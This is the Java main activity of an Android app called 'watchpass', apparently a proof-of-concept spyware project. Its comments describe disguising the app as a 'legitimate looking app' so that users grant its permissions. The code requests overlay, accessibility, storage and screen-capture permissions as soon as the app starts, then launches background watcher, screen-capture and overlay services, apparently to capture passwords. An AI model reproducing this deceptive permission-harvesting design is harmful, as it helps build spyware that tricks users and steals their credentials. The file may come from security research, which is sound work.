package com.stevenbenack.watchpass;

import android.Manifest;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;

import butterknife.BindView;
import butterknife.ButterKnife;

/**
 * App activity - the only screen that the user would see. We could use this activity/page and others to create a
 * legitimate looking app that does something - ideally some app that seems like it would actually use permissions.
 * In theory, it would be fairly easy to modify this app to take screenshots in Snapchat, which would make a great
 * justification for why this app needs multiple permissions from the user.
 *
 * In this case, this screen is just a testbench for me that asks for permissions and  on the app start, starts the
 * background services I need to do everything.
 */
public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";

    // Android permission request tags, allows identification of what request we are seeing in the log
    private static final int BASE_PERMISSION_REQUEST = 4;
    private static final int SYSTEM_ALERT_PERMISSION_REQUEST = 20;
    private static final int ACCESSIBILITY_PERMISSION_REQUEST = 16;
    private static final boolean DO_ACCESSIBILITY_CHECK = false;       // turn off accessibility check prompt while testing
    private static final int SCREENSHOT_PERMISSION_REQUEST = 91;

    // UI components of screen
    @BindView(R.id.password_field)
    EditText passwordField;
    @BindView(R.id.screenshot_button)
    Button screenshotButton;
    @BindView(R.id.root_layout)
    ConstraintLayout rootLayout;
    @BindView(R.id.floating_screen_button)
    Button floatingScreenButton;

    private PermissionRequestHandler permissionRequestHandler;
    private MediaProjectionManager mediaProjectionManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);

        permissionRequestHandler = new PermissionRequestHandler();
        mediaProjectionManager = (MediaProjectionManager)getSystemService(MEDIA_PROJECTION_SERVICE);
    }

    @Override
    protected void onStart() {
        super.onStart();

        requestPermissions();
        requestAccessibilityPermissions();
        getVirtualScreenCapturePermission();

        screenshotButton.setOnClickListener(v -> getVirtualScreenCapturePermission());
        floatingScreenButton.setOnClickListener(v -> {
            Intent i = new Intent(getApplicationContext(), DrawScreenService.class);
            startService(i);
        });
    }

    private void requestPermissions() {
        if ( !permissionRequestHandler.hasPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) ) {
            permissionRequestHandler.requestUnGrantedPermissions(this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.SYSTEM_ALERT_WINDOW,
                                    Manifest.permission.FOREGROUND_SERVICE}, BASE_PERMISSION_REQUEST);
        }

        if( Build.VERSION.SDK_INT >= 23 ) {
            if ( !Settings.canDrawOverlays(this) ) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, SYSTEM_ALERT_PERMISSION_REQUEST);
            }
        }
    }

    private void requestAccessibilityPermissions() {
        if ( !permissionRequestHandler.hasAccessibilityServicePermissions(this, WatcherService.class) && DO_ACCESSIBILITY_CHECK ) {
            // ask user to allow permission
            Log.d(TAG, "Does not have Watcher Accessibility Service Enabled");
            showAccessibilityPermissionDialog();
        }
    }

    private void showAccessibilityPermissionDialog() {
        AlertDialog.Builder permissionDialog = new AlertDialog.Builder(this);
        permissionDialog.setTitle(R.string.dialog_title);
        permissionDialog.setMessage(R.string.dialog_text);
        permissionDialog.setPositiveButton(R.string.dialog_affirmative_button_text, (dialog, which) -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(intent, ACCESSIBILITY_PERMISSION_REQUEST);
        });
        permissionDialog.setNegativeButton(R.string.dialog_cancel_button_text, (dialog, which) -> dialog.dismiss());
        permissionDialog.show();
    }

    private void getVirtualScreenCapturePermission() {
        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), SCREENSHOT_PERMISSION_REQUEST);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if ( requestCode == SCREENSHOT_PERMISSION_REQUEST ) {
            if ( resultCode == RESULT_OK ) {
                Intent i = new Intent(this, VirtualScreenCaptureService.class)
                                .putExtra(VirtualScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
                                .putExtra(VirtualScreenCaptureService.EXTRA_RESULT_INTENT, data);

                startService(i);
            }
        }
        finish();
    }
}
